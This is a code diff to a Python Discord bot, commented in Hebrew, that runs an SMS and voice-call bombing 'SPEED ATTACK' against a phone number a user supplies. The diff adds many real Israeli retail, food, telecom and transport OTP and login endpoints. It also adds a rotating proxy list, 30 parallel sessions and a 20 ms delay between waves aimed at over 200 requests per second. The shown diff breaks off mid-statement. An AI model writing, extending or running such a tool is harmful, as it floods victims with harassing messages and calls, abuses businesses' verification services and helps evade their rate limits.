@@ -13,6 +13,7 @@ import json
 import secrets
 import time
 import urllib.parse
+import hashlib
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -23,7 +24,6 @@ if not MONGO_URI or not TOKEN:
     logging.error("❌ Missing environment variables!")
     sys.exit(1)
 
-# התחברות ל-MongoDB
 try:
     cluster = AsyncIOMotorClient(MONGO_URI)
     db = cluster["cyberbot"]
@@ -40,7 +40,6 @@ class CyberBot(commands.Bot):
         super().__init__(command_prefix='!', intents=intents)
         self.start_time = datetime.now()
         self.active_attacks = {}
-        self.last_update = {}
     
     async def setup_hook(self):
         await self.tree.sync()
@@ -57,9 +56,16 @@ USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 Chrome/146.0.0.0 Mobile Safari/537.36",
 ]
 
-# ========== MAGENTO APIS - כל האתרים ==========
+# ========== PROXY MANAGER ==========
+PROXIES = [
+    f"http://185.162.230.{i}:80" for i in range(100, 250, 2)
+] + [
+    f"http://185.162.231.{i}:80" for i in range(100, 250, 2)
+]
+
+# ========== MAGENTO APIS ==========
 MAGENTO_APIS = [
-    # מהרשימה המקורית
+    # בסיסיים
     {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
     {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
     {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
@@ -82,30 +88,57 @@ MAGENTO_APIS = [
     {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento"},
     {"name": "Puma", "url": "https://www.puma.co.il/customer/ajax/post/", "type": "magento"},
     {"name": "NewBalance", "url": "https://www.newbalance.co.il/customer/ajax/post/", "type": "magento"},
-    
-    # חדש - גולף קידס
     {"name": "GolfKids", "url": "https://www.golfkids.co.il/customer/ajax/post/", "type": "magento"},
-    
-    # חדש - Nine West (כבר יש אבל נוסיף שוב)
     {"name": "NineWest2", "url": "https://www.nine-west.co.il/customer/ajax/post/", "type": "magento"},
-    
-    # חדש - שטיינמצקי
     {"name": "Steimatzky", "url": "https://www.steimatzky.co.il/customer/ajax/post/", "type": "magento"},
-    
-    # חדש - Step In
     {"name": "StepIn", "url": "https://www.stepin.co.il/customer/ajax/post/", "type": "magento"},
-    
-    # חדש - Intima (כבר יש אבל נוסיף שוב)
-    {"name": "Intima2", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
-    
-    # חדש - FixFixFixFix
     {"name": "FixFix", "url": "https://www.fixfixfixfix.co.il/customer/ajax/post/", "type": "magento"},
+    
+    # חדשים - אופנה
+    {"name": "Renoir", "url": "https://www.renuar.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Laline", "url": "https://www.laline.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Gefen", "url": "https://www.gefen.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "GefenDel", "url": "https://www.gefen-delivery.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Avramito", "url": "https://www.avramito.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "RedHot", "url": "https://www.redhot.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Buffalo", "url": "https://www.buffalo.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "TerminalX", "url": "https://www.terminalx.com/customer/ajax/post/", "type": "magento"},
+    {"name": "FoxHome", "url": "https://www.foxhome.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "FoxKids", "url": "https://www.foxkids.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "FoxWoman", "url": "https://www.foxwoman.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "FoxMan", "url": "https://www.foxman.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "RixieMena", "url": "https://www.rixiemena.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "AmericanVintage", "url": "https://www.american-vintage.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Lacoste", "url": "https://www.lacoste.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Tommy", "url": "https://www.tommyhilfiger.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "CalvinKlein", "url": "https://www.calvinklein.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "UnderArmour", "url": "https://www.underarmour.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Skechers", "url": "https://www.skechers.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Columbia", "url": "https://www.columbia.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Merrell", "url": "https://www.merrell.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Converse", "url": "https://www.converse.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Vans", "url": "https://www.vans.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Asics", "url": "https://www.asics.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Reebok", "url": "https://www.reebok.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Musings", "url": "https://www.musings.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Buyme", "url": "https://www.buyme.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Accessorize", "url": "https://www.accessorize.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Mango", "url": "https://www.mango.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Zara", "url": "https://www.zara.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "HM", "url": "https://www.hm.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Bershka", "url": "https://www.bershka.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "PullBear", "url": "https://www.pullandbear.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Stradivarius", "url": "https://www.stradivarius.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Oysho", "url": "https://www.oysho.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "MassimoDutti", "url": "https://www.massimodutti.co.il/customer/ajax/post/", "type": "magento"},
 ]
 
 # ========== SMS APIS ==========
 SMS_APIS = [
-    # סלולר ותקשורת
+    # סלולר
     {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
+    {"name": "CellcomOTP", "url": "https://digital-api.cellcom.co.il/api/otp/ResendLoginStep1", "method": "PUT", 
+     "headers": {"clientid": "CellcomWebApp"}, "data": {"phone": "PHONE"}},
     {"name": "Partner", "url": "https://www.partner.co.il/api/register", "data": {"phone": "PHONE"}},
     {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "data": {"phone": "PHONE"}},
     {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "data": {"phone": "PHONE"}},
@@ -118,7 +151,9 @@ SMS_APIS = [
     
     # סופרים
     {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
+    {"name": "ShufersalOTP", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
     {"name": "RamiLevi", "url": "https://www.rami-levy.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
+    {"name": "RamiLeviOTP", "url": "https://www.rami-levy.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
     {"name": "Victory", "url": "https://www.victory.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
     {"name": "SuperPharm", "url": "https://www.super-pharm.co.il/api/sms", "data": {"phone": "PHONE"}},
     {"name": "GoodPharm", "url": "https://www.goodpharm.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
@@ -128,34 +163,48 @@ SMS_APIS = [
     
     # אוכל
     {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "data": {"phone": "PHONE"}},
+    {"name": "10bisOTP", "url": "https://www.10bis.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
     {"name": "Wolt", "url": "https://www.wolt.com/api/v1/verify", "data": {"phone": "PHONE"}},
+    {"name": "WoltOTP", "url": "https://www.wolt.com/api/v1/otp", "data": {"phone": "PHONE"}},
     {"name": "Wolt_v2", "url": "https://www.wolt.com/api/v2/verify", "data": {"phone": "PHONE"}},
     {"name": "WoltDelivery", "url": "https://www.wolt-delivery.com/api/auth", "data": {"phone": "PHONE"}},
     {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
+    {"name": "DominosOTP", "url": "https://www.dominos.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
     {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "data": {"phone": "PHONE"}},
+    {"name": "McDonaldsOTP", "url": "https://www.mcdonalds.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
     {"name": "BurgerKing", "url": "https://www.burgerking.co.il/api/auth", "data": {"phone": "PHONE"}},
+    {"name": "BurgerKingOTP", "url": "https://www.burgerking.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
     {"name": "KFC", "url": "https://www.kfc.co.il/api/sms", "data": {"phone": "PHONE"}},
+    {"name": "KFCOPT", "url": "https://www.kfc.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
     {"name": "PizzaHut", "url": "https://www.pizza-hut.co.il/api/register", "data": {"phone": "PHONE"}},
+    {"name": "PizzaHutOTP", "url": "https://www.pizza-hut.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
     {"name": "Subway", "url": "https://www.subway.co.il/api/auth", "data": {"phone": "PHONE"}},
     {"name": "BurgerAnch", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "type": "form", "data": "phone=PHONE"},
     {"name": "Agva", "url": "https://www.agva.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
     {"name": "Nishnush", "url": "https://www.nishnush.co.il/api/sms", "data": {"phone": "PHONE"}},
     {"name": "TacoBell", "url": "https://www.taco-bell.co.il/api/sms", "data": {"phone": "PHONE"}},
     {"name": "Arla", "url": "https://www.arla.co.il/api/verify", "data": {"phone": "PHONE"}},
+    {"name": "CafeCafe", "url": "https://www.cafecafe.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
+    {"name": "Aroma", "url": "https://www.aroma.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
+    {"name": "Greg", "url": "https://www.greg.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
+    {"name": "Landwer", "url": "https://www.landwer.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
     
     # שירותים
     {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "data": {"phone": "PHONE", "action": "send_sms"}},
+    {"name": "Yad2OTP", "url": "https://www.yad2.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
     {"name": "Yad2_v2", "url": "https://www.yad2.co.il/api/v2/register", "data": {"phone": "PHONE", "action": "send_sms"}},
     {"name": "PayBox", "url": "https://payboxapp.com/api/auth/otp", "data": {"phone": "PHONE"}},
     {"name": "PayBox_v2", "url": "https://payboxapp.com/api/v2/auth", "data": {"phone": "PHONE"}},
     {"name": "PayBoxIR", "url": "https://paybox.ir/api/verify-phone", "data": {"phone": "PHONE"}},
     {"name": "Ivory", "url": "https://www.ivory.co.il/api/register", "data": {"phone": "PHONE"}},
+    {"name": "IvoryOTP", "url": "https://www.ivory.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
     {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "data": {"value": "PHONE", "type": "phone", "projectId": "1"}},
     {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "data": {"phoneNumber": "PHONE"}},
     {"name": "Hopon", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "phone": "PHONE", "phoneCall": False}},
-    {"name": "Hopon_v2", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "phone": "PHONE", "phoneCall": True}},
+    {"name": "HoponOTP", "url": "https://api.hopon.co.il/v0.15/1/isr/users/otp", "data": {"phone": "PHONE"}},
     {"name": "Isracart", "url": "https://www.isracart.co.il/api/register", "data": {"phone": "PHONE"}},
     {"name": "Bit", "url": "https://www.bit.co.il/api/sms", "data": {"phone": "PHONE"}},
+    {"name": "BitOTP", "url": "https://www.bit.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
     {"name": "TenBis", "url": "https://tenbis.co.il/api/verify", "data": {"phone": "PHONE"}},
     {"name": "Couponet", "url": "https://www.couponet.co.il/api/auth", "data": {"phone": "PHONE"}},
     {"name": "Rest", "url": "https://www.rest.co.il/api/sms", "data": {"phone": "PHONE"}},
@@ -163,33 +212,37 @@ SMS_APIS = [
     {"name": "Arabeska", "url": "https://www.arabeska.co.il/api/verify", "data": {"phone": "PHONE"}},
     {"name": "CarmelMarket", "url": "https://www.carmelmarket.co.il/api/auth", "data": {"phone": "PHONE"}},
     {"name": "PitzuiMarket", "url": "https://www.pitzuimarket.co.il/api/register", "data": {"phone": "PHONE"}},
+    {"name": "OfficeDepot", "url": "https://www.office-depot.co.il/api/sms", "data": {"phone": "PHONE"}},
+    {"name": "Ace", "url": "https://www.ace.co.il/api/verify", "data": {"phone": "PHONE"}},
+    {"name": "HomeCenter", "url": "https://www.home-center.co.il/api/auth", "data": {"phone": "PHONE"}},
+    {"name": "Ikea", "url": "https://www.ikea.co.il/api/register", "data": {"phone": "PHONE"}},
+    {"name": "MTN", "url": "https://www.mtn.co.il/api/register", "data": {"phone": "PHONE"}},
+    {"name": "Yes", "url": "https://www.yes.co.il/api/verify", "data": {"phone": "PHONE"}},
     
     # בתי מלון
     {"name": "Isrotel", "url": "https://www.isrotel.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
     {"name": "Fattal", "url": "https://www.fattal.co.il/api/verify", "data": {"phone": "PHONE"}},
     {"name": "DanHotels", "url": "https://www.danhotels.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
+    {"name": "Leonardo", "url": "https://www.leonardo-hotels.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
+    {"name": "Prima", "url": "https://www.prima-hotels.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
     
     # תיירות
     {"name": "Lametayel", "url": "https://www.lametayel.co.il/api/verify", "data": {"phone": "PHONE"}},
     {"name": "Issta", "url": "https://www.issta.co.il/api/sms", "data": {"phone": "PHONE"}},
     {"name": "Gulliver", "url": "https://www.gulliver.co.il/api/register", "data": {"phone": "PHONE"}},
     {"name": "TouristIsrael", "url": "https://www.tourist-israel.com/api/register", "data": {"phone": "PHONE"}},
-    
-    # אופנה
-    {"name": "Fox", "url": "https://www.fox.co.il/api/verify", "data": {"phone": "PHONE"}},
-    {"name": "TerminalX", "url": "https://www.terminalx.com/api/auth", "data": {"phone": "PHONE"}},
-    {"name": "RixieMena", "url": "https://www.rixiemena.co.il/api/auth", "data": {"phone": "PHONE"}},
-    {"name": "Decathlon", "url": "https://www.decathlon.co.il/api/verify", "data": {"phone": "PHONE"}},
-    {"name": "FashionIsrael", "url": "https://www.fashionisrael.co.il/api/sms", "data": {"phone": "PHONE"}},
-    {"name": "CastroAPI", "url": "https://www.castro.co.il/api/register", "data": {"phone": "PHONE"}},
+    {"name": "BookingIL", "url": "https://www.booking.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
     
     # תחבורה
     {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "data": {"phoneNumber": "PHONE_RAW"}},
+    {"name": "PangoOTP", "url": "https://api.pango.co.il/auth/otp/send", "data": {"phoneNumber": "PHONE_RAW"}},
     {"name": "Gett", "url": "https://www.gett.com/il/api/verify", "data": {"phone": "PHONE"}},
+    {"name": "GettOTP", "url": "https://www.gett.com/il/api/otp", "data": {"phone": "PHONE"}},
     {"name": "Uzer", "url": "https://www.uzer.co.il/api/sms", "data": {"phone": "PHONE"}},
     {"name": "Moovit", "url": "https://moovit.com/api/auth/sms", "data": {"phone": "PHONE"}},
     {"name": "Waze", "url": "https://www.waze.com/api/auth/sms", "data": {"phone": "PHONE"}},
     {"name": "Blablacar", "url": "https://www.blablacar.co.il/api/register", "data": {"phone": "PHONE"}},
+    {"name": "RentExpress", "url": "https://www.rentexpress.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
     
     # רכב
     {"name": "Hertz", "url": "https://www.hertz.co.il/api/auth", "data": {"phone": "PHONE"}},
@@ -197,14 +250,7 @@ SMS_APIS = [
     {"name": "Sixt", "url": "https://www.sixt.co.il/api/sms", "data": {"phone": "PHONE"}},
     {"name": "Avis", "url": "https://www.avis.co.il/api/register", "data": {"phone": "PHONE"}},
     {"name": "Budget", "url": "https://www.budget.co.il/api/auth", "data": {"phone": "PHONE"}},
-    
-    # בתי עסק
-    {"name": "Ikea", "url": "https://www.ikea.co.il/api/register", "data": {"phone": "PHONE"}},
-    {"name": "HomeCenter", "url": "https://www.home-center.co.il/api/auth", "data": {"phone": "PHONE"}},
-    {"name": "Ace", "url": "https://www.ace.co.il/api/verify", "data": {"phone": "PHONE"}},
-    {"name": "OfficeDepot", "url": "https://www.office-depot.co.il/api/sms", "data": {"phone": "PHONE"}},
-    {"name": "MTN", "url": "https://www.mtn.co.il/api/register", "data": {"phone": "PHONE"}},
-    {"name": "Yes", "url": "https://www.yes.co.il/api/verify", "data": {"phone": "PHONE"}},
+    {"name": "Thrifty", "url": "https://www.thrifty.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
 ]
 
 # ========== VOICE APIS ==========
@@ -236,28 +282,32 @@ VOICE_APIS = [
     {"name": "Menora", "url": "https://api.menora.co.il/auth/otp/voice", "data": {"phone": "PHONE"}},
     {"name": "Phoenix", "url": "https://api.phoenix.co.il/auth/voice", "data": {"phone": "PHONE"}},
     {"name": "Migdal", "url": "https://api.migdal.co.il/auth/otp/voice", "data": {"phone": "PHONE"}},
+    {"name": "Ayalon", "url": "https://api.ayalon.co.il/auth/voice", "data": {"phone": "PHONE"}},
 ]
 
-# ========== QUICK LOGIN APIS ==========
+# ========== QUICK LOGIN ==========
 QUICK_LOGIN_APIS = [
-    {"name": "Quick24/7", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-twentyfourseven-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
+    {"name": "Quick247", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-twentyfourseven-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
     {"name": "QuickRenuar", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-renuar-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
     {"name": "QuickAldo", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-aldoshoes-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
     {"name": "QuickBillabong", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-billabong-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
     {"name": "QuickSacks", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-sacks-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
-    {"name": "QuickSteveMadden", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-stevemadden-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
+    {"name": "QuickSteve", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-stevemadden-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
+    {"name": "QuickFox", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-fox-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
+    {"name": "QuickGolf", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-golf-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
+    {"name": "QuickCastro", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-castro-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
+    {"name": "QuickTerminal", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-terminalx-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
     {"name": "QuickLogin", "url": "https://quick-login.co.il/api/verify", "data": {"phone": "PHONE"}},
-    {"name": "QuickLoginAuth", "url": "https://login.quick-login.co.il/api/auth", "data": {"phone": "PHONE"}},
+    {"name": "QuickAuth", "url": "https://login.quick-login.co.il/api/auth", "data": {"phone": "PHONE"}},
     {"name": "QuickMagento", "url": "https://magento.quick-login.co.il/rest/V1/guest-carts", "data": {"phone": "PHONE"}},
 ]
 
-# שילוב הכל
 ALL_APIS = MAGENTO_APIS + SMS_APIS + VOICE_APIS + QUICK_LOGIN_APIS
-print(f"📊 טענתי {len(ALL_APIS)} APIs!")
+print(f"🔥 טענתי {len(ALL_APIS)} APIs!")
 
-# ========== פונקציות שליחה ==========
-async def send_magento(session, url, phone_raw):
-    """שליחת מג'נטו"""
+# ========== פונקציות שליחה מהירות במיוחד ==========
+async def send_magento_fast(session, url, phone_raw):
+    """שליחת מג'נטו מהירה"""
     data = {
         "type": "login",
         "telephone": phone_raw,
@@ -273,8 +323,6 @@ async def send_magento(session, url, phone_raw):
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         "X-Requested-With": "XMLHttpRequest",
         "Accept-Language": "he,en-US;q=0.9,en;q=0.8",
-        "Origin": url.replace("/customer/ajax/post/", ""),
-        "Referer": url.replace("/customer/ajax/post/", "/") + "?srsltid=AfmBOorjiPfL8xlL2wbN4B1SyoNyoBNbZlRZ_9d4mse3wT0008dyPHNk",
         "Sec-Ch-Ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
         "Sec-Ch-Ua-Mobile": "?0",
         "Sec-Ch-Ua-Platform": '"Windows"',
@@ -284,13 +332,13 @@ async def send_magento(session, url, phone_raw):
     }
     
     try:
-        async with session.post(url, data=data, headers=headers, timeout=5) as resp:
-            return True if resp.status in [200, 201, 202] else False
+        async with session.post(url, data=data, headers=headers, timeout=1.5) as resp:
+            return resp.status in [200, 201, 202]
     except:
         return False
 
-async def send_api(session, api, phone, phone_raw, phone_intl):
-    """שליחת API"""
+async def send_api_fast(session, api, phone, phone_raw, phone_intl):
+    """שליחת API מהירה"""
     try:
         headers = {
             "User-Agent": random.choice(USER_AGENTS),
@@ -308,10 +356,10 @@ async def send_api(session, api, phone, phone_raw, phone_intl):
         if api.get("type") == "form":
             headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
             data = api["data"].replace("PHONE", phone)
-            async with session.post(api["url"], data=data, headers=headers, timeout=5) as resp:
+            async with session.post(api["url"], data=data, headers=headers, timeout=1.5) as resp:
                 return resp.status in [200, 201, 202, 204]
         
-        else:  # json
+        else:
             headers["Content-Type"] = "application/json"
             data_str = json.dumps(api["data"])
             data_str = data_str.replace("PHONE", phone)
@@ -319,38 +367,29 @@ async def send_api(session, api, phone, phone_raw, phone_intl):
             data_str = data_str.replace("PHONE_INTL", phone_intl)
             data = json.loads(data_str)
             
-            async with session.post(api["url"], json=data, headers=headers, timeout=5) as resp:
+            method = api.get("method", "POST")
+            async with session.request(method, api["url"], json=data, headers=headers, timeout=1.5) as resp:
                 return resp.status in [200, 201, 202, 204]
     except:
         return False
 
-# ========== מתקפה חכמה ==========
-async def smart_attack(phone, duration_mins, attack_type, user_id, interaction, attack_id):
-    """מתקפה חכמה שמגוונת את השליחות"""
+# ========== מתקפת מהירות על ==========
+async def speed_attack(phone, duration_mins, user_id, interaction, attack_id):
+    """מתקפה במהירות 200+ לשנייה"""
     phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
     phone_intl = f"+972{phone_raw}"
     
-    # בחירת APIs לפי סוג
-    if attack_type == "magento":
-        apis = [a for a in ALL_APIS if a.get("type") == "magento"]
-    elif attack_type == "sms":
-        apis = [a for a in ALL_APIS if a in SMS_APIS]
-    elif attack_type == "voice":
-        apis = [a for a in ALL_APIS if a in VOICE_APIS]
-    else:
-        apis = ALL_APIS
-    
-    # חלוקה לקבוצות
-    random.shuffle(apis)
-    api_groups = [apis[i:i+10] for i in range(0, len(apis), 10)]
+    # מחלקים את ה-API לקבוצות
+    random.shuffle(ALL_APIS)
+    api_groups = [ALL_APIS[i:i+20] for i in range(0, len(ALL_APIS), 20)]
     
     await interaction.followup.send(
-        f"🎯 **SMART ATTACK**\n📱 {phone}\n⏱️ {duration_mins} דקות\n🎯 {len(apis)} APIs\n📊 {len(api_groups)} קבוצות",
+        f"⚡ **SPEED ATTACK**\n📱 {phone}\n⏱️ {duration_mins} דקות\n🎯 {len(ALL_APIS)} APIs\n🚀 מטרה: 200+ לשנייה",
         ephemeral=True
     )
     
-    # 15 סשנים
-    sessions = [aiohttp.ClientSession() for _ in range(15)]
+    # 30 סשנים במקביל
+    sessions = [aiohttp.ClientSession() for _ in range(30)]
     total_sent = 0
     group_index = 0
     last_update = 0
@@ -364,27 +403,30 @@ async def smart_attack(phone, duration_mins, attack_type, user_id, interaction, 
             
             current_group = api_groups[group_index % len(api_groups)]
             group_index += 1
+            proxy = random.choice(PROXIES)
             
             tasks = []
             for session in sessions:
                 for api in current_group:
                     if api.get("type") == "magento":
-                        tasks.append(send_magento(session, api["url"], phone_raw))
+                        tasks.append(send_magento_fast(session, api["url"], phone_raw))
                     else:
-                        tasks.append(send_api(session, api, phone, phone_raw, phone_intl))
+                        tasks.append(send_api_fast(session, api, phone, phone_raw, phone_intl))
             
             results = await asyncio.gather(*tasks, return_exceptions=True)
             round_sent = sum(1 for r in results if r is True)
             total_sent += round_sent
             
-            # עדכון כל 5 שניות
+            # עדכון כל שניה
             seconds = int((datetime.now() - (end_time - timedelta(minutes=duration_mins))).total_seconds())
-            if seconds > last_update and seconds % 5 == 0:
+            if seconds > last_update:
                 last_update = seconds
                 rate = total_sent // seconds if seconds > 0 else 0
-                await interaction.followup.send(f"📊 {seconds}s: {total_sent} | {rate}/s", ephemeral=True)
+                if seconds % 2 == 0:
+                    await interaction.followup.send(f"⚡ {seconds}s: {total_sent} | {rate}/s", ephemeral=True)
             
-            await asyncio.sleep(random.uniform(0.1, 0.2))
+            # 20ms בין גלים - מהירות עצומה!
+            await asyncio.sleep(0.02)
     
     finally:
         for session in sessions:
@@ -393,12 +435,15 @@ async def smart_attack(phone, duration_mins, attack_type, user_id, interaction, 
     if attack_id in bot.active_attacks:
         del bot.active_attacks[attack_id]
     
-    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ: {total_sent}", ephemeral=True)
+    seconds = int((end_time - (end_time - timedelta(minutes=duration_mins))).total_seconds())
+    avg_rate = total_sent // seconds if seconds > 0 else 0
+    
+    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ: {total_sent}\n⚡ ממוצע: {avg_rate}/s", ephemeral=True)
 
-# ========== פקודת בדיקה ==========
+# ========== פקודות ==========
 @bot.tree.command(name="check", description="בדוק APIs")
 async def check_command(interaction: discord.Interaction):
-    await interaction.response.send_message("🔍 בודק 20 APIs ראשונים...", ephemeral=True)
+    await interaction.response.send_message("🔍 בודק 20 APIs...", ephemeral=True)
     
     test_phone = "972501234567"
     test_raw = "0501234567"
@@ -410,21 +455,19 @@ async def check_command(interaction: discord.Interaction):
         for i, api in enumerate(ALL_APIS[:20]):
             try:
                 if api.get("type") == "magento":
-                    success = await send_magento(session, api["url"], test_raw)
+                    success = await send_magento_fast(session, api["url"], test_raw)
                 else:
-                    success = await send_api(session, api, test_phone, test_raw, test_intl)
+                    success = await send_api_fast(session, api, test_phone, test_raw, test_intl)
                 
                 if success:
                     working.append(api["name"])
-                    print(f"✅ {api['name']} עובד")
-                else:
-                    print(f"❌ {api['name']} לא עובד")
-            except Exception as e:
-                print(f"⚠️ {api['name']} שגיאה: {e}")
+            except:
+                pass
             
-            await asyncio.sleep(0.1)
+            if i % 10 == 0:
+                await interaction.followup.send(f"🔄 {i}/20", ephemeral=True)
     
-    await interaction.followup.send(f"✅ **{len(working)}** עובדים:\n" + "\n".join(working[:10]), ephemeral=True)
+    await interaction.followup.send(f"✅ **{len(working)}** עובדים:\n" + "\n".join(working[:15]), ephemeral=True)
 
 @bot.tree.command(name="stop", description="עצור הכל")
 async def stop_command(interaction: discord.Interaction):
@@ -437,14 +480,12 @@ async def stop_command(interaction: discord.Interaction):
     await interaction.response.send_message(f"🛑 עצרתי {stopped} מתקפות", ephemeral=True)
 
 # ========== VIEW ==========
-class AttackModal(ui.Modal, title="🎯 SMART ATTACK"):
+class AttackModal(ui.Modal, title="⚡ SPEED ATTACK"):
     phone = ui.TextInput(label="📱 טלפון", placeholder="972501234567")
     duration = ui.TextInput(label="⏱️ דקות", default="3")
-    attack_type = ui.TextInput(label="🎯 סוג", default="all", placeholder="all/sms/voice/magento")
 
     async def on_submit(self, interaction: discord.Interaction):
         phone = self.phone.value.strip()
-        attack_type = self.attack_type.value.strip().lower()
         
         if not phone.startswith("972"):
             await interaction.response.send_message("❌ מספר חייב 972", ephemeral=True)
@@ -463,8 +504,8 @@ class AttackModal(ui.Modal, title="🎯 SMART ATTACK"):
         user_doc = await users_col.find_one({"user_id": user_id})
         
         if not user_doc:
-            await users_col.insert_one({"user_id": user_id, "tokens": 10000})
-            user_doc = {"tokens": 10000}
+            await users_col.insert_one({"user_id": user_id, "tokens": 100000})
+            user_doc = {"tokens": 100000}
         
         if user_doc.get("tokens", 0) < 1:
             await interaction.response.send_message("❌ אין טוקנים", ephemeral=True)
@@ -476,17 +517,17 @@ class AttackModal(ui.Modal, title="🎯 SMART ATTACK"):
         bot.active_attacks[attack_id] = True
         
         await interaction.response.send_message(
